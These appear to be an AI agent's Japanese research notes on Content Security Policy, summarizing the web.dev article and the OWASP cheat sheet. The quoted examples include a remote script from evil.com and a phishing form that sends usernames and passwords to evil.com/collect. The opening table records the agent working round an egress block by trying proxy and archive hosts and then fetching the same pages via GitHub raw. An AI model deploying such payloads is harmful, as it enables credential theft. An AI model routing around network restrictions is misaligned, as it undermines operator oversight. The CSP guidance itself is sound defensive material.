# [12] CSP（Content Security Policy）の基礎 — web.dev「Content security policy」+ OWASP CSP Cheat Sheet

担当ID: 12 (csp-basics) / 想定章: ch02

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
|---|---|---|---|
| https://web.dev/articles/csp | partial | GitHub raw（`https://raw.githubusercontent.com/GoogleChrome/web.dev/main/src/site/content/en/blog/csp/index.md`） | WebFetchは `EGRESS_BLOCKED`（web.dev はネットワーク egress ポリシーでブロック）、curl も CONNECT 403。そこで**同記事の原稿Markdown**を GoogleChrome/web.dev リポジトリから取得。本文・コード例は**全量逐語で取得できた**が、リポジトリ側原稿のメタデータは `date: 2012-06-15 / updated: 2020-06-19`（著者 mikewest, joemedley）であり、現行ライブページがその後改訂されていた場合の差分は未確認。よって status を partial とする。 |
| https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html | full | GitHub raw（`https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Content_Security_Policy_Cheat_Sheet.md`、19,428 bytes） | WebFetch/curl は同じく 403（cheatsheetseries.owasp.org もブロック対象）。ただし当該HTMLページは MkDocs がこの Markdown をレンダリングしたものなので、**原典そのもの**を全量取得できたと判断。 |
| （補助）https://web.dev/strict-csp/ | full | GitHub raw（`.../src/site/content/en/blog/strict-csp/index.md`、25,697 bytes） | 担当URLではないが、**両担当URLが「strict CSP の詳細手順はこれを見よ」と明示的に参照している一次資料**。重点抽出項目（strict-dynamic、strict CSPの推奨形）を埋めるために取得。出典を明記して別節に収録。著者 lwe、date 2021-03-15 / updated 2023-06-10。 |
| （補助）https://web.dev/trusted-types/ | full | GitHub raw（`.../src/site/content/en/blog/trusted-types/index.md`、12,747 bytes） | 同上。重点抽出項目 `require-trusted-types-for` / Trusted Types を埋めるために取得。著者 koto、date 2020-03-25。 |

ブロックされたホスト（エージェントプロキシの `recentRelayFailures` より）: `web.dev:443`, `cheatsheetseries.owasp.org:443`, `web.archive.org:443`, `r.jina.ai:443`, `developers.google.com:443`, `wd.imgix.net:443` — いずれも `gateway answered 403 to CONNECT (policy denial)`。web.archive.org も塞がれているためスナップショット経由のフォールバックは不可。GitHub の raw は通ったため、**一次原稿ソース経由**で内容を確保した。

## 要約

- CSP は「同一オリジンポリシーだけでは防げない XSS（注入されたコードをブラウザがページ正規のコードと区別できない問題）」に対する**多層防御（defense in depth）の第二層**。`Content-Security-Policy` レスポンスヘッダでブラウザに「何を読み込み・実行してよいか」を宣言する。
- 配信方法は3つ: `Content-Security-Policy` ヘッダ（推奨・全機能）、`Content-Security-Policy-Report-Only` ヘッダ（非強制・レポートのみ）、`<meta http-equiv="Content-Security-Policy" content="...">`（ただし `frame-ancestors` / `sandbox` / レポート系は使えない）。`X-Content-Security-Policy` と `X-WebKit-CSP` は**使ってはならない**（obsolete・バグだらけ）。
- ディレクティブは fetch 系（`default-src`, `script-src`, `style-src`, `img-src`, `connect-src`, `font-src`, `media-src`, `object-src`, `manifest-src`, `child-src`, `worker-src`, `frame-src`, `script-src-elem/attr`, `style-src-elem/attr`）、document 系（`base-uri`, `sandbox`, `plugin-types`）、navigation 系（`form-action`, `frame-ancestors`）、reporting 系（`report-to`, `report-uri`）に分かれる。
- source list 文法: スキーム指定（`data:`, `https:`）、ホスト名のみ（`example.com` は任意スキーム・任意ポートにマッチ）、完全修飾（`https://example.com:443`）。ワイルドカードはスキーム・ポート・ホスト名の**最左位置のみ**。`*://*.example.com:*` はサブドメインにマッチするが `example.com` 自身にはマッチしない。キーワード `'none'` `'self'` `'unsafe-inline'` `'unsafe-eval'` は**シングルクォート必須**（`script-src self` はクォート無しだと「self という名のホスト」になる）。
- インラインスクリプトと `eval` 系は CSP のデフォルトで全面禁止。どうしても必要なら nonce（毎レスポンス再生成・推測不能・128bit以上・Base64）または hash（`sha256-` / `sha384-` / `sha512-`、`<script>` タグ自体は含めない、空白・大文字小文字が効く）で個別許可する。
- 現在の推奨は**ホスト許可リスト型ではなく strict CSP**（nonce or hash + `'strict-dynamic'` + `object-src 'none'` + `base-uri 'none'`）。許可リスト型は「ほとんどの構成でバイパス可能」であり XSS 防止として実効性が低い。
- 導入手順は Report-Only で観測 → 違反修正 → 強制へ。違反は `report-uri`（deprecated）/ `report-to`（CSP3・Reporting API、`Reporting-Endpoints` ヘッダのグループ名を参照）で JSON レポートとして収集する。
- DOM XSS の残存リスク（nonce 付きスクリプトの `src` への注入、`document.createElement('script')` の引数への注入、jQuery `.html()`、旧 AngularJS テンプレート注入、`'unsafe-eval'` 下の `eval()`）は strict CSP でも防げない。ここを埋めるのが `require-trusted-types-for 'script'`（Trusted Types）。

---

## 詳細ノート

# 第1部: web.dev「Content security policy」（出典: https://web.dev/articles/csp）

原稿メタデータ（逐語）:

```yaml
title: Content security policy
subhead: Content Security Policy can significantly reduce the risk and impact of cross-site scripting attacks in modern browsers.
date: 2012-06-15
updated: 2020-06-19
authors:
  - mikewest
  - joemedley
description: Content Security Policy can significantly reduce the risk and impact of cross-site scripting attacks in modern browsers.
tags:
  - blog
```

### 1.1 導入 — 同一オリジンポリシーとXSS （出典: https://web.dev/articles/csp）

- Web のセキュリティモデルの根幹は**同一オリジンポリシー（same-origin policy）**。`https://mybank.com` のコードは `https://mybank.com` のデータにのみアクセスでき、`https://evil.example.com` は決してアクセスを許されない。各オリジンは Web の残りから隔離され、開発者に安全なサンドボックスを与える。「理論上はこれで完璧（perfectly brilliant）」だが、実際には攻撃者がこの仕組みを覆す巧妙な手段を見つけてきた。
- **XSS（Cross-site scripting）** は、サイトを騙して「意図されたコンテンツと一緒に悪意あるコードを配信させる」ことで同一オリジンポリシーを回避する。これが大問題なのは、**ブラウザがページ上に現れる全てのコードを、そのページのセキュリティオリジンの正当な一部として信頼してしまう**から。
- 原文は攻撃手法の断面として [XSS Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)（XSS Filter Evasion Cheat Sheet）を「古いが代表的」として挙げている。
- 攻撃者が**どんなコードでも1つでも**注入に成功したら「pretty much game over」: ユーザーのセッションデータが侵害され、秘密であるべき情報が攻撃者に流出する。

### 1.2 Summary（原文の要点箇条書き・逐語訳） （出典: https://web.dev/articles/csp）

原文 `## Summary` 節（逐語）:

```
* Use allowlists to tell the client what's allowed and what isn't.
* Learn what directives are available.
* Learn the keywords they take.
* Inline code and `eval()` are considered harmful.
* Report policy violations to your server before enforcing them.
```

日本語:
- 許可リスト（allowlist）を使って、何が許され何が許されないかをクライアントに伝える。
- どのディレクティブが使えるかを学ぶ。
- それらが受け取るキーワードを学ぶ。
- インラインコードと `eval()` は有害と見なす。
- 強制する前に、ポリシー違反を自サーバーへ報告させる。

### 1.3 Source allowlists（ソース許可リスト） （出典: https://web.dev/articles/csp）

- XSS が突く問題の本質は、**ブラウザが「アプリの一部であるスクリプト」と「第三者が悪意で注入したスクリプト」を区別できない**こと。原文の例では、ページ下部の Google +1 ボタンが `https://apis.google.com/js/plusone.js` のコードをこのページのオリジンのコンテキストで読み込み実行する。我々はそのコードを信頼しているが、ブラウザが自力で「`apis.google.com` のコードは素晴らしいが `apis.evil.example.com` のコードはおそらくそうでない」と判断することは期待できない。**ブラウザはページが要求した任意のコードを、出所に関係なく喜んでダウンロードして実行する。**
- そこで CSP は `Content-Security-Policy` HTTP ヘッダを定義し、信頼するコンテンツのソースの許可リストを作り、**それらのソース由来のリソースのみを実行/描画せよ**とブラウザに指示する。攻撃者がスクリプトを注入する穴を見つけても、そのスクリプトは許可リストに合致しないので実行されない。

#### コード/コマンド（原文のまま逐語）

`apis.google.com` と自分自身のみを script のソースとして許可するポリシー:

```http
Content-Security-Policy: script-src 'self' https://apis.google.com
```

- `script-src` は特定ページの script 関連権限の集合を制御するディレクティブ。`'self'` を1つの有効な script ソースとして指定し、`https://apis.google.com` をもう1つとして指定している。ブラウザは `apis.google.com` からの JavaScript を HTTPS 経由で、および現在のページのオリジンから、忠実にダウンロードして実行する。

ポリシー違反時にコンソールへ出るエラー（原文の図の alt テキスト・逐語）:

```
Refused to load the script 'http://evil.example.com/evil.js' because it violates the following Content Security Policy directive: script-src 'self' https://apis.google.com
```

- このポリシーが定義されていると、ブラウザは他のソースからスクリプトを読み込む代わりに単にエラーを投げる。攻撃者がコードを注入できても、期待した成功ではなくエラーメッセージに突き当たる。

### 1.4 ポリシーは多種のリソースに適用される（Level 2 時点のディレクティブ一覧） （出典: https://web.dev/articles/csp）

原文の注記: 以下の一覧は**Level 2 時点**のディレクティブの状態を表す。[Level 3 spec](https://www.w3.org/TR/CSP3/) は公開されているが、主要ブラウザでは largely unimplemented（原文執筆時点の記述）。

| ディレクティブ | 原文の説明（要約訳） |
|---|---|
| `base-uri` | ページの `<base>` 要素に現れてよい URL を制限する。 |
| `child-src` | worker と埋め込みフレームの内容の URL を列挙する。例: `child-src https://youtube.com` とすると YouTube からの動画埋め込みは可能になるが他オリジンからはできない。 |
| `connect-src` | 接続先オリジンを制限する（XHR、WebSockets、EventSource 経由）。 |
| `font-src` | Web フォントを提供できるオリジンを指定する。Google の Web フォントは `font-src https://themes.googleusercontent.com` で有効化できる。 |
| `form-action` | `<form>` タグからの送信先として有効なエンドポイントを列挙する。 |
| `frame-ancestors` | 現在のページを埋め込めるソースを指定する。`<frame>`, `<iframe>`, `<embed>`, `<applet>` タグに適用される。**`<meta>` タグでは使えず**、非HTMLリソースにのみ適用される（原文表記: "applies only to non-HTML resources"）。 |
| `frame-src` | Level 2 で deprecated だったが Level 3 で復活。指定がなければ従来どおり `child-src` にフォールバックする。 |
| `img-src` | 画像を読み込めるオリジンを定義する。 |
| `media-src` | 動画・音声を配信できるオリジンを制限する。 |
| `object-src` | Flash やその他プラグインの制御を可能にする。 |
| `plugin-types` | ページが呼び出せるプラグインの種類を制限する。 |
| `report-uri` | CSP 違反時にブラウザがレポートを送る URL を指定する。**`<meta>` タグでは使えない。** |
| `style-src` | スタイルシートに対する `script-src` の対応物。 |
| `upgrade-insecure-requests` | URL スキームを書き換え、HTTP を HTTPS に変えるよう UA に指示する。書き換えが必要な古い URL を大量に持つサイト向け。 |
| `worker-src` | CSP Level 3 のディレクティブで、worker / shared worker / service worker として読み込める URL を制限する。2017年7月時点では実装が限定的。 |

**デフォルトは全開（wide open）**:
- 特定のディレクティブ（たとえば `font-src`）にポリシーを設定しなければ、そのディレクティブは `*` を有効なソースとして指定したのと同じ挙動になる（＝どこからでもフォントを読み込める、無制限）。
- この既定挙動は **`default-src`** ディレクティブを指定することで上書きできる。`default-src` は、指定しなかったほとんどのディレクティブの既定値を定める。一般に `-src` で終わるあらゆるディレクティブに適用される。`default-src` が `https://example.com` に設定され `font-src` を指定しなかった場合、フォントは `https://example.com` からのみ読み込める。先の例では `script-src` のみ指定したので、画像・フォント等は任意のオリジンから読み込める状態だった。

**`default-src` にフォールバック*しない*ディレクティブ（原文逐語リスト）**。これらを設定しないことは「何でも許す」のと同じである点に注意:

```
* base-uri
* form-action
* frame-ancestors
* plugin-types
* report-uri
* sandbox
```

**同一種類のリソースは1つのディレクティブにまとめる**:
- ディレクティブは HTTP ヘッダ内にセミコロン区切りで並べる。ある種類の必要リソースは**すべて1つのディレクティブに**列挙しなければならない。
- `script-src https://host1.com; script-src https://host2.com` と書くと、**2つ目のディレクティブは単に無視される**。

#### コード/コマンド（原文のまま逐語）

正しい書き方:

```http
script-src https://host1.com https://host2.com
```

全リソースを CDN（`https://cdn.example.net`）から読み込み、フレーム化コンテンツもプラグインも不要なアプリのポリシー例:

```http
Content-Security-Policy: default-src https://cdn.example.net; child-src 'none'; object-src 'none'
```

### 1.5 実装の詳細（Implementation details） （出典: https://web.dev/articles/csp）

- Web 上の各種チュートリアルには `X-WebKit-CSP` と `X-Content-Security-Policy` ヘッダが出てくるが、**今後はこれらプレフィクス付きヘッダを無視すべき**。モダンブラウザ（IE を除く）はプレフィクス無しの `Content-Security-Policy` ヘッダをサポートしており、それを使うべき。
- どのヘッダを使うにせよ、**ポリシーはページ単位（page-by-page basis）で定義される**。保護したいすべてのレスポンスに HTTP ヘッダを付ける必要がある。これは柔軟性をもたらし、ページ固有の必要に応じてポリシーを微調整できる（例: +1 ボタンがあるページ群だけボタンのコード読み込みを許可する）。

**source list の文法（重要・逐語ベース）**:
- スキームで指定: `data:`, `https:`
- 具体性の幅:
  - ホスト名のみ: `example.com` → **そのホスト上の任意のオリジンにマッチ（任意のスキーム、任意のポート）**
  - 完全修飾 URI: `https://example.com:443` → HTTPS のみ、`example.com` のみ、ポート 443 のみにマッチ
- **ワイルドカードは受け付けられるが、スキーム・ポート・ホスト名の最左位置のみ**。`*://*.example.com:*` は `example.com` の全サブドメインに（任意スキーム・任意ポートで）マッチするが、**`example.com` 自身にはマッチしない**。

**source list が受け付ける4つのキーワード（原文逐語）**:

| キーワード | 原文の説明 |
|---|---|
| `'none'` | 予想どおり、何にもマッチしない（matches nothing）。 |
| `'self'` | 現在のオリジンにマッチするが、**そのサブドメインにはマッチしない**。 |
| `'unsafe-inline'` | インライン JavaScript と CSS を許可する。 |
| `'unsafe-eval'` | `eval` のような text-to-JavaScript 機構を許可する。 |

- これらのキーワードには**シングルクォートが必須**。例: `script-src 'self'`（クォート付き）は現在のホストからの JavaScript 実行を認可するが、`script-src self`（クォート無し）は「`self` という名前のサーバー」からの JavaScript を許可し、**現在のホストからは許可しない**。これはおそらく意図した動作ではない。

### 1.6 Sandboxing （出典: https://web.dev/articles/csp）

- もう一つ触れておくべきディレクティブが `sandbox`。これは他と少し異なり、**ページが読み込めるリソースではなく、ページが取れる動作（actions）に制限をかける**。
- `sandbox` ディレクティブが存在すると、そのページは `sandbox` 属性付き `<iframe>` の中に読み込まれたかのように扱われる。効果は広範で、ページを一意のオリジン（unique origin）に強制したり、フォーム送信を防いだりする。
- 有効な sandboxing 属性の詳細は HTML5 仕様の "Sandboxing" 節（https://html.spec.whatwg.org/dev/origin.html#sandboxing ）を参照。

### 1.7 meta タグ （出典: https://web.dev/articles/csp）

- CSP の推奨配信手段は HTTP ヘッダだが、マークアップ内で直接ページにポリシーを設定できると便利な場合がある。その場合 `http-equiv` 属性付きの `<meta>` タグを使う。

#### コード/コマンド（原文のまま逐語）

```html
<meta http-equiv="Content-Security-Policy" content="default-src https://cdn.example.net; child-src 'none'; object-src 'none'">
```

- **これは `frame-ancestors`、`report-uri`、`sandbox` には使えない。**

### 1.8 「インラインコードは有害」（Inline code is considered harmful） （出典: https://web.dev/articles/csp）

- CSP は許可リスト型オリジン指定に基づくが、オリジンベースの許可リストは **XSS 最大の脅威である「インラインスクリプト注入」を解決しない**。攻撃者が悪意あるペイロードを直接含む script タグ（`<script>sendMyDataToEvilDotCom()</script>`）を注入できる場合、ブラウザはそれを正当なインライン script タグと区別する仕組みを持たない。**CSP はインライン script を全面禁止することでこの問題を解く。それが確実であるための唯一の方法（"it's the only way to be sure"）。**
- この禁止は `script` タグに直接埋め込まれたスクリプトだけでなく、**インラインイベントハンドラ**と **`javascript:` URL** も含む。`script` タグの中身は外部ファイルへ移し、`javascript:` URL や `<a ... onclick="[JAVASCRIPT]">` は適切な `addEventListener()` 呼び出しに置き換える必要がある。

#### コード/コマンド（原文のまま逐語）

書き換え前:

```html
<script>
    function doAmazingThings() {
    alert('YOU AM AMAZING!');
    }
</script>
<button onclick='doAmazingThings();'>Am I amazing?</button>
```

書き換え後:

```html
<!-- amazing.html -->
<script src='amazing.js'></script>
<button id='amazing'>Am I amazing?</button>
```

```js
// amazing.js
function doAmazingThings() {
    alert('YOU AM AMAZING!');
}
document.addEventListener('DOMContentLoaded', function () {
    document.getElementById('amazing')
    .addEventListener('click', doAmazingThings);
});
```

- 書き換え後のコードは CSP 対応以外にも利点が多く、CSP を使うかどうかに関係なくすでにベストプラクティス。インライン JavaScript は構造と振る舞いを混ぜてしまう。外部リソースはブラウザがキャッシュしやすく、開発者にとって理解しやすく、コンパイル・minify に適する。
- **インラインスタイルも同様に扱われる**。`style` 属性も `style` タグも外部スタイルシートに統合すべき。CSS が可能にする「驚くほど巧妙な」データ漏洩手法（原文リンク: scarybeastsecurity.blogspot.com の generic cross-browser cross-domain theft の記事）への防御のため。
- どうしてもインライン script/style が必要なら `script-src` / `style-src` の許可ソースに `'unsafe-inline'` を追加することで有効化できる。nonce や hash も使えるが「really shouldn't」。**インライン script の禁止は CSP が提供する最大のセキュリティ上の勝利**であり、インライン style の禁止も同様にアプリを堅牢にする。

### 1.9 どうしても必要な場合 — nonce と hash （出典: https://web.dev/articles/csp）

- CSP Level 2 は、暗号学的 nonce（number used once）または hash を使って特定のインラインスクリプトを許可リストに加えることで、インラインスクリプトの後方互換性を提供する。煩雑だが、いざというときに有用。

#### コード/コマンド（原文のまま逐語）

nonce の使い方 — script タグに `nonce` 属性を与える。その値は信頼ソースのリストにあるものと一致しなければならない:

```html
<script nonce="EDNnf03nceIOfn39fn3e9h3sdfa">
    // Some inline code I can't remove yet, but need to asap.
</script>
```

`nonce-` キーワードに付けて `script-src` ディレクティブに nonce を追加:

```http
Content-Security-Policy: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'
```

- **nonce はページリクエストごとに再生成されなければならず、推測不能でなければならない（"must be regenerated for every page request and they must be unguessable"）。**

hash の使い方 — script タグにコードを追加する代わりに、**スクリプト自体の SHA ハッシュ**を作って `script-src` に追加する。ページがこれを含む場合:

```html
<script>alert('Hello, world.');</script>
```

ポリシーはこうなる:

```http
Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='
```

注意点（原文逐語ベース）:
- `sha*-` プレフィクスがハッシュ生成アルゴリズムを指定する。上の例では `sha256-` を使用。CSP は **`sha384-` と `sha512-` もサポート**する。
- ハッシュ生成時に **`<script>` タグは含めない**。
- **大文字小文字と空白（先頭・末尾の空白を含む）が効く（capitalization and whitespace matter, including leading or trailing whitespace）。**
- SHA ハッシュ生成方法は各言語で見つかる。**Chrome 40 以降では DevTools を開いてページを再読み込みすると、Console タブに各インラインスクリプトの正しい sha256 ハッシュを含むエラーメッセージが表示される。**

### 1.10 Eval too（`eval` も禁止） （出典: https://web.dev/articles/csp）

- 攻撃者がスクリプトを直接注入できない場合でも、アプリを騙して「本来不活性なテキストを実行可能な JavaScript に変換して実行させる」ことができる場合がある。**`eval()`、`new Function()`、`setTimeout([string], …)`、`setInterval([string], ...)`** はすべて、注入されたテキストが予期せず悪意ある動作として実行されうる経路。CSP のこのリスクに対する既定の応答は、**これらの経路を完全にブロックすること**。

アプリ構築への影響（原文逐語ベース）:
- JSON は `eval` に頼らず**組み込みの `JSON.parse` でパースしなければならない**。ネイティブ JSON 操作は **IE8 以降のすべてのブラウザ**で利用可能で、完全に安全。
- 文字列を使っている `setTimeout` / `setInterval` の呼び出しは、インライン関数を使うよう書き換える。

#### コード/コマンド（原文のまま逐語）

```js
setTimeout("document.querySelector('a').style.display = 'none';", 10);
```

は次のように書いた方がよい:

```js
setTimeout(function () {
    document.querySelector('a').style.display = 'none';
}, 10);
```

- **実行時のインラインテンプレーティングを避ける**: 多くのテンプレートライブラリは実行時のテンプレート生成を速くするため `new Function()` を多用する。動的プログラミングの巧みな応用だが、悪意あるテキストを評価してしまうリスクを伴う。CSP を標準サポートし、`eval` がない環境では堅牢なパーサーにフォールバックするフレームワークもある。**AngularJS の `ng-csp` ディレクティブ**（https://docs.angularjs.org/api/ng/directive/ngCsp ）がその好例。
- さらに良い選択は**プリコンパイルを提供するテンプレート言語**（例: Handlebars のプリコンパイル、https://handlebarsjs.com/installation/precompilation.html ）。プリコンパイルは最速の実行時実装よりさらにユーザー体験を速くでき、かつ安全。
- `eval` とその同類がアプリに不可欠な場合は `script-src` に `'unsafe-eval'` を許可ソースとして追加すれば有効化できるが、**強く非推奨（strongly discourage）**。文字列実行能力を禁止することで、攻撃者が認可されていないコードをサイト上で実行するのは格段に困難になる。

### 1.11 Reporting（違反レポート） （出典: https://web.dev/articles/csp）

- CSP が信頼されないリソースをクライアント側でブロックできることはユーザーにとって大きな勝利だが、そもそも悪意ある注入を許してしまうバグを特定し潰すために、**サーバー側へ何らかの通知が返ってくると非常に助かる**。そのために、`report-uri` ディレクティブで指定した場所へ **JSON 形式の違反レポートを `POST`** するようブラウザに指示できる。

#### コード/コマンド（原文のまま逐語）

```http
Content-Security-Policy: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;
```

レポートの中身の例:

```json
{
    "csp-report": {
    "document-uri": "http://example.org/page.html",
    "referrer": "http://evil.example.com/",
    "blocked-uri": "http://evil.example.com/evil.js",
    "violated-directive": "script-src 'self' https://apis.google.com",
    "original-policy": "script-src 'self' https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser"
    }
}
```

レポートに含まれる情報（原文逐語ベース）:
- `document-uri`: 違反が起きたページ
- `referrer`: そのページの referrer（**注意: HTTP ヘッダフィールドと違い、このキーは綴り間違いをしていない** — HTTP の `Referer` は 1 つの r だが、レポートのキーは `referrer`）
- `blocked-uri`: ページのポリシーに違反したリソース
- `violated-directive`: 違反された具体的なディレクティブ
- `original-policy`: ページの完全なポリシー

#### Report-Only

- CSP を始めたばかりなら、厳格なポリシーをユーザーに展開する前にアプリの現状を評価するのが理にかなっている。完全な展開への踏み台として、**制限を強制せず違反を報告するだけのモニタリング**をブラウザに依頼できる。`Content-Security-Policy` ヘッダの代わりに `Content-Security-Policy-Report-Only` ヘッダを送る。

```http
Content-Security-Policy-Report-Only: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;
```

- report-only モードで指定したポリシーは制限対象リソースをブロックしないが、指定した場所へ違反レポートを送る。**両方のヘッダを同時に送ることもでき、片方を強制しつつ別のポリシーを監視できる。** これはアプリの CSP 変更の影響を評価する優れた方法: 新ポリシーのレポートを有効化し、違反レポートを監視してバグを修正し、効果に満足したら新ポリシーの強制を開始する。

### 1.12 Real World Usage（実世界での利用と3つのユースケース） （出典: https://web.dev/articles/csp）

- CSP 1 は Chrome、Safari、Firefox でかなり実用的だが IE 10 ではサポートが非常に限定的。**CSP Level 2 は Chrome 40 以降で利用可能**。Twitter や Facebook のような巨大サイトがこのヘッダを展開済み（Twitter のケーススタディ: https://blog.twitter.com/engineering/en_us/a/2011/improving-browser-security-with-csp.html ）。標準は自サイトへ展開を始められる状態にある。
- ポリシー作成の第一歩は、**実際に読み込んでいるリソースを評価すること**。アプリの構成が把握できたら、その要件に基づいてポリシーを設定する。

#### Use case #1: social media widgets（ソーシャルメディアウィジェット）

- Facebook の Like button には複数の実装オプションがあるが、原文の推奨は **`<iframe>` 版**（サイトの他の部分から安全にサンドボックスされているため）。正しく動作させるには **`child-src https://facebook.com`** ディレクティブが必要。既定で Facebook が提供する `<iframe>` コードは相対 URL `//facebook.com` を読み込むので、**明示的に HTTPS を指定して `https://facebook.com` に変えること**。必要がないなら HTTP を使う理由はない。
- Twitter の Tweet button は `https://platform.twitter.com` にホストされたスクリプトとフレームの両方へのアクセスに依存する（Twitter も既定で相対 URL を提供するので、ローカルにコピペする際に HTTPS を明示する）。**`script-src https://platform.twitter.com; child-src https://platform.twitter.com`** で対応できる。ただし Twitter が提供する JavaScript スニペットを外部 JavaScript ファイルに移すこと。
- 他のプラットフォームも同様の要件で、同様に対処できる。原文の提案: **まず `default-src` を `'none'` に設定し、コンソールを見ながらウィジェットを動かすために有効化が必要なリソースを判定する**。
- 複数ウィジェットを含めるのは単純にポリシーディレクティブを結合するだけ。**同一種類のリソースはすべて1つのディレクティブにまとめること**を忘れない。3つのソーシャルメディアウィジェットをすべて使うならポリシーは次のようになる。

```http
script-src https://apis.google.com https://platform.twitter.com; child-src https://plusone.google.com https://facebook.com https://platform.twitter.com
```

#### Use case #2: lockdown（ロックダウン）

- 銀行サイトを運用しており、**自分たちが書いたリソースのみが読み込まれる**ことを保証したい場合。このシナリオでは**すべてを絶対的にブロックする既定ポリシー（`default-src 'none'`）から始めて**積み上げる。
- 前提: 銀行は画像・スタイル・スクリプトのすべてを CDN `https://cdn.mybank.net` から読み込み、`https://api.mybank.com/` へ XHR で接続して各種データを取得する。フレームは使うがサイトローカルのページのみ（第三者オリジンなし）。Flash なし、フォントなし、追加要素なし。送れる最も制限的な CSP ヘッダは:

```http
Content-Security-Policy: default-src 'none'; script-src https://cdn.mybank.net; style-src https://cdn.mybank.net; img-src https://cdn.mybank.net; connect-src https://api.mybank.com; child-src 'self'
```

#### Use case #3: SSL only（SSL のみ）

- 結婚指輪のディスカッションフォーラムの管理者が、すべてのリソースを安全なチャネル経由でのみ読み込ませたいが、自分はあまりコードを書かず、インライン script/style で埋め尽くされた第三者製フォーラムソフトウェアの大部分を書き換える能力はない。次のポリシーが効果的:

```http
Content-Security-Policy: default-src https:; script-src https: 'unsafe-inline'; style-src https: 'unsafe-inline'
```

- **重要な注意**: `default-src` に `https:` を指定していても、script と style のディレクティブはそのソースを自動的に継承しない。**各ディレクティブは、その特定のリソース種別についての既定値を完全に上書きする（Each directive completely overwrites the default for that specific type of resource.）。**

### 1.13 The future （出典: https://web.dev/articles/csp）

- Content Security Policy Level 2 は Candidate Recommendation（https://www.w3.org/TR/CSP2/ ）。W3C の Web Application Security Working Group は次のイテレーションである Content Security Policy Level 3（https://www.w3.org/TR/CSP3/ ）の作業をすでに開始している。
- 今後の機能に関する議論に興味があれば public-webappsec@ メーリングリストのアーカイブ（http://lists.w3.org/Archives/Public/public-webappsec/ ）を見るか、自分で参加する。

---

# 第2部: OWASP Content Security Policy Cheat Sheet（出典: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html）

### 2.1 Introduction

- この記事は Web アプリのクライアントサイドに **defense in depth（多層防御）** の概念を統合する方法を提示する。サーバーから CSP ヘッダを注入することで、ブラウザは「現在訪問中のページにコンテンツを読み込む動的な呼び出し」からユーザーを保護できる状態になる。

### 2.2 Context

- XSS（Cross-Site Scripting）、クリックジャッキング、cross-site leak 脆弱性の増加により、より defense in depth なセキュリティアプローチが求められている。

#### 2.2.1 Defense against XSS（CSP が XSS を防ぐ5つの方法）

CSP は以下の方法で XSS を防御する。

**1. Restricting Inline Scripts（インラインスクリプトの制限）** — ページがインラインスクリプトを実行することを防ぐことで、次のような注入攻撃は機能しなくなる。

```html
<script>document.body.innerHTML='defaced'</script>
```

**2. Restricting Remote Scripts（リモートスクリプトの制限）** — 任意のサーバーからスクリプトを読み込むことを防ぐことで、次のような注入攻撃は機能しなくなる。

```html
<script src="https://evil.com/hacked.js"></script>
```

**3. Restricting Unsafe JavaScript（危険な JavaScript の制限）** — `eval` のような text-to-JavaScript 関数の実行を防ぐことで、次のような脆弱性から安全になる。

```js
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

**4. Restricting Form submissions（フォーム送信の制限）** — サイト上の HTML フォームがどこにデータを送信できるかを制限することで、フィッシングフォームの注入も機能しなくなる。

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

**5. Restricting Objects（object の制限）** — HTML の `object` タグを制限することで、攻撃者が悪意ある flash/Java/その他のレガシー実行可能物をページに注入することも不可能になる。

#### 2.2.2 Defense against framing attacks（フレーミング攻撃への防御）

- クリックジャッキングや一部のブラウザサイドチャネル攻撃（xs-leaks）は、**悪意あるサイトが標的サイトをフレーム内に読み込むこと**を必要とする。
- 歴史的には `X-Frame-Options` ヘッダがこの用途に使われてきたが、**CSP の `frame-ancestors` ディレクティブによって obsolete になった**。

#### 2.2.3 Defense in Depth

- 強い CSP は各種脆弱性（特に XSS）に対する実効的な**第二層（second layer）**の保護を提供する。CSP は Web アプリが脆弱性を*含むこと*自体は防げないが、**その脆弱性を攻撃者が悪用するのを著しく困難にできる**。
- ユーザー入力を一切受け付けない完全な静的サイトであっても、CSP を使って **Subresource Integrity (SRI)** の使用を強制できる。これは、アナリティクススクリプト等の JavaScript ファイルをホストしている第三者サイトの1つが侵害された場合に、悪意あるコードがサイト上で読み込まれることを防ぐ助けになる。
- とはいえ、**CSP を XSS に対する唯一の防御機構として頼ってはならない（should not）**。Cross-Site Scripting Prevention Cheat Sheet に記述されているような良い開発プラクティスに従い、その上に**追加のセキュリティ層として** CSP を展開すること。

### 2.3 Policy Delivery（ポリシーの配信 — 3つの方法）

#### 1. Content-Security-Policy Header

Web サーバーから `Content-Security-Policy` HTTP レスポンスヘッダを送る。

```text
Content-Security-Policy: ...
```

- ヘッダを使うのが**推奨される方法**で、**CSP の全機能セットをサポート**する。index ページだけでなく**すべての HTTP レスポンスで送る**こと。
- これは W3C Spec の標準ヘッダ。Firefox 23+、Chrome 25+、Opera 19+ でサポート。

#### 2. Content-Security-Policy-Report-Only Header

`Content-Security-Policy-Report-Only` を使うと、**強制されない CSP** を配信できる。

```text
Content-Security-Policy-Report-Only: ...
```

- それでも違反レポートはコンソールに出力され、`report-to` および `report-uri` ディレクティブが使われていれば違反エンドポイントに配送される。
- これも W3C Spec 標準ヘッダ。Firefox 23+、Chrome 25+、Opera 19+ でサポートされ、ポリシーは非ブロッキング（"fail open"）であり、`report-uri`（または新しい `report-to`）ディレクティブで指定された URL にレポートが送られる。**ブロッキングモード（"fail closed"）で CSP を利用する前段としてよく使われる。**
- ブラウザは `Content-Security-Policy` と `Content-Security-Policy-Report-Only` を**同時に使う能力を完全にサポート**しており、問題は起きない。このパターンは例えば、**厳格な `Report-Only` ポリシーを走らせて多くの違反レポートを得つつ、より緩い強制ポリシーで正当なサイト機能を壊さないようにする**のに使える。

